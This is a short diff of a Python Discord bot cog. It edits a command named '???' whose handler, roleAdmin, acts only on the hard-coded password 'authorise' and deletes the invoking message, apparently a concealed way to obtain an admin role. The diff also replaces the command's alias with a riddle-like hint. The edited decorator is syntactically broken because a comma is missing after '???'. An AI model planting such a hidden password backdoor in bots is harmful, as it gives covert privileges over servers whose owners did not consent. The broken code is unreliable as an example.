@@ -8,7 +8,9 @@ class Role(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
 
-	@commands.command('???', aliases=['password is'])
+	@commands.command(
+		'???'
+		brief='"Twinkle twinkle little star, how I wonder what you are."')
 	async def roleAdmin(self, ctx, password:str=None):
 		if password != 'authorise': return
 		await ctx.message.delete()
